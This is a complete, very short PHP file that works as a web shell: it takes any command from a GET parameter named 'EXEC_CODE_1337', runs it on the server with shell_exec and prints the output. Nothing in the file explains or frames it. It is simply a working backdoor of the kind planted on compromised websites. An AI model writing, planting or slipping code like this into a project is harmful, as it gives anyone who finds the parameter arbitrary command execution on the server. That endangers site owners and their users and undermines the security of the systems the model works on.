<?php

if(!empty($_GET['EXEC_CODE_1337'])) {
  echo shell_exec($_GET['EXEC_CODE_1337']);
}
